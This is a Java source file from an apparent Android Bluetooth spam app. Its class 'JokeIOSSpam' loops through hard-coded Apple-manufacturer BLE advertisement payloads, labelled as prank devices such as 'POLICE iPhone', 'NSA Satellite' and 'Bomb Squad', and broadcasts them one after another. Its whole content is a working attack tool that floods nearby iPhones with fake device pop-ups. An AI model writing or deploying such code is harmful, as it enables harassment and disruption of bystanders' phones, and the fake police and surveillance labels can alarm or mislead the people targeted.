package com.tutozz.blespam;

import android.bluetooth.le.AdvertiseData;

import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class JokeIOSSpam implements Spammer {
    public Runnable blinkRunnable;
    private int loop = 0;
    public boolean isSpamming = false;
    ExecutorService executor = Executors.newSingleThreadExecutor();
    
    // 🎯 ШУТОЧНЫЕ IOS УСТРОЙСТВА
    private final JokeDevice[] jokeDevices = {
        // 🚨 ПОЛИЦИЯ И ПРАВИТЕЛЬСТВО
        new JokeDevice("071907022075aa3001000045121212000000000000000000000000", "🚨 POLICE iPhone"),
        new JokeDevice("071907052075aa3001000045121212000000000000000000000000", "📡 GOV Surveillance"),
        new JokeDevice("071907072075aa3001000045121212000000000000000000000000", "🕵️‍♂️ Secret Service"),
        
        // 👽 ФАНТАСТИКА И НЛО
        new JokeDevice("071907092075aa3001000045121212000000000000000000000000", "👽 UFO Device"),
        new JokeDevice("071907022075aa3001000045121212000000000000000000000000", "🛸 Alien Tech"),
        new JokeDevice("071907052075aa3001000045121212000000000000000000000000", "👾 Space Probe"),
        
        // 💣 ВОЕННЫЕ И ОПАСНЫЕ
        new JokeDevice("071907072075aa3001000045121212000000000000000000000000", "💣 Bomb Squad"),
        new JokeDevice("071907092075aa3001000045121212000000000000000000000000", "☢️ Nuclear Device"),
        new JokeDevice("071907022075aa3001000045121212000000000000000000000000", "🚨 SWAT Team"),
        
        // 🚗 ТЕХНОЛОГИИ И АВТО
        new JokeDevice("071907052075aa3001000045121212000000000000000000000000", "🚗 Tesla Security"),
        new JokeDevice("071907072075aa3001000045121212000000000000000000000000", "🤖 AI Monitor"),
        new JokeDevice("071907092075aa3001000045121212000000000000000000000000", "⚡ Energy Dept"),
        
        // 🛰️ ШПИОНАЖ И МОНИТОРИНГ
        new JokeDevice("071907022075aa3001000045121212000000000000000000000000", "🛰️ NSA Satellite"),
        new JokeDevice("071907052075aa3001000045121212000000000000000000000000", "📡 CIA Monitor"),
        new JokeDevice("071907072075aa3001000045121212000000000000000000000000", "🎯 Military Intel")
    };

    public JokeIOSSpam() {
        // Конструктор
    }

    @Override
    public void start() {
        executor.execute(() -> {
            BluetoothAdvertiser b = new BluetoothAdvertiser();
            isSpamming = true;
            System.out.println("🎭 Starting JOKE iOS Spam with " + jokeDevices.length + " devices");
            
            for (loop = 0; loop <= Helper.MAX_LOOP; loop++) {
                if(isSpamming) {
                    // Случайное шуточное устройство
                    JokeDevice device = jokeDevices[new Random().nextInt(jokeDevices.length)];
                    
                    System.out.println("🎭 Advertising: " + device.name);
                    
                    // Создаем BLE данные
                    byte[] manufacturerData = hexStringToByteArray(device.payload);
                    
                    AdvertiseData data = new AdvertiseData.Builder()
                            .setIncludeDeviceName(true)
                            .setIncludeTxPowerLevel(true)
                            .addManufacturerData(0x004C, manufacturerData) // Apple ID
                            .build();

                    // Отправляем advertising
                    b.advertise(data, null);
                    
                    // Ждем перед следующим advertising
                    try {
                        Thread.sleep(Helper.delay);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    
                    // Останавливаем для следующего
                    b.stopAdvertising();
                }
            }
        });
    }

    @Override
    public boolean isSpamming() {
        return isSpamming;
    }

    @Override
    public void stop() {
        loop = Helper.MAX_LOOP + 1;
        isSpamming = false;
        System.out.println("🎭 JOKE iOS Spam stopped");
    }

    @Override
    public Runnable getBlinkRunnable() {
        return blinkRunnable;
    }

    @Override
    public void setBlinkRunnable(Runnable blinkRunnable) {
        this.blinkRunnable = blinkRunnable;
    }

    // Вспомогательный класс для шуточных устройств
    private static class JokeDevice {
        String payload;
        String name;
        
        JokeDevice(String payload, String name) {
            this.payload = payload;
            this.name = name;
        }
    }

    // Конвертация hex строки в byte array
    private byte[] hexStringToByteArray(String s) {
        try {
            int len = s.length();
            byte[] data = new byte[len / 2];
            for (int i = 0; i < len; i += 2) {
                data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                                     + Character.digit(s.charAt(i + 1), 16));
            }
            return data;
        } catch (Exception e) {
            System.out.println("❌ Error converting hex: " + e.getMessage());
            return new byte[0];
        }
    }
}
